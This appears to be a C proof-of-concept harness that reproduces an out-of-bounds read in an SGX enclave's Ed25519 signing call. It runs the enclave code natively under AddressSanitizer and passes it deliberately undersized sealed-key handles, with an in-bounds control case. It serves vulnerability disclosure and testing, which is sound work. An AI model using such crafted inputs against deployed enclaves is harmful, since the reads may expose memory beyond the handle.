/*
 * Native, non-SGX differential oracle for the pinned sk-sgx sealed-handle
 * out-of-bounds read.  It links the unmodified upstream enclave.c and the
 * pinned SDK's real sgx_get_encrypt_txt_len/sgx_get_add_mac_txt_len source
 * under AddressSanitizer.
 *
 * h1: key_handle_len = 1.  enclave.c:178 reads plain_text_offset at byte 512
 *     of a 1-byte handle before any length check.
 * h2: key_handle_len = offsetof(plain_text_offset) + 4.  The first accessor
 *     is in bounds and returns 64; enclave.c:189 then reads payload_size at
 *     byte 528, past the 516-byte handle.
 * h0: full sgx_sealed_data_t-sized handle control.  Both accessors are in
 *     bounds; the original application rejects the non-matching AAD length
 *     without reaching sgx_unseal_data.
 *
 * The non-reached sealing/random services are recording stubs that abort if
 * called, so a control cannot silently take an unmodeled path.
 */

#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <sgx_tseal.h>
#include <sgx_trts.h>

#include "sk_t.h"

int memset_s(void *s, size_t smax, int c, size_t n)
{
    if (s == NULL)
        return 22; /* EINVAL */
    memset(s, c, n < smax ? n : smax);
    return n > smax ? 75 /* EOVERFLOW */ : 0;
}

int consttime_memequal(const void *a, const void *b, size_t len)
{
    return len == 0 || memcmp(a, b, len) == 0;
}

sgx_status_t sgx_read_rand(unsigned char *buf, size_t len)
{
    memset(buf, 0x5a, len);
    return SGX_SUCCESS;
}

sgx_status_t sgx_seal_data(uint32_t additional_mac_len,
    const uint8_t *additional_mac, uint32_t plaintext_len,
    const uint8_t *plaintext, uint32_t sealed_size,
    sgx_sealed_data_t *sealed)
{
    (void)additional_mac_len; (void)additional_mac;
    (void)plaintext_len; (void)plaintext; (void)sealed_size; (void)sealed;
    abort();
}

sgx_status_t sgx_unseal_data(const sgx_sealed_data_t *sealed,
    uint8_t *additional_mac, uint32_t *additional_mac_len,
    uint8_t *plaintext, uint32_t *plaintext_len)
{
    (void)sealed; (void)additional_mac; (void)additional_mac_len;
    (void)plaintext; (void)plaintext_len;
    abort();
}

void ocall_puts(const char *str)
{
    (void)str;
}

int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "h1";
    size_t aad_off = offsetof(sgx_sealed_data_t, plain_text_offset);
    size_t payload_off = offsetof(sgx_sealed_data_t, aes_data.payload_size);
    size_t len;
    uint8_t *handle;
    uint8_t message[32] = {0};
    uint8_t sig_r[64] = {0};
    uint32_t counter = 0;
    int result;

    if (strcmp(mode, "h1") == 0) {
        len = 1;
    } else if (strcmp(mode, "h2") == 0) {
        len = aad_off + sizeof(uint32_t);
    } else if (strcmp(mode, "h0") == 0) {
        len = sizeof(sgx_sealed_data_t);
    } else {
        fprintf(stderr, "usage: %s h0|h1|h2\n", argv[0]);
        return 2;
    }

    handle = calloc(1, len);
    if (handle == NULL)
        return 2;
    if (strcmp(mode, "h2") == 0) {
        uint32_t value = 64; /* sizeof(the sealed Ed25519 secret key) */
        memcpy(handle + aad_off, &value, sizeof value);
    } else if (strcmp(mode, "h0") == 0) {
        uint32_t value = 64;
        memcpy(handle + aad_off, &value, sizeof value);
        memcpy(handle + payload_off, &value, sizeof value);
    }

    result = ecall_sk_sign_ed25519(message, sizeof message, "vuln", handle,
        len, 1, &counter, sig_r, sizeof sig_r);
    printf("NATIVE %s handle_len=%zu sizeof_sealed=%zu aad_off=%zu payload_off=%zu result=%d\n",
        mode, len, sizeof(sgx_sealed_data_t), aad_off, payload_off, result);
    free(handle);
    return 0;
}
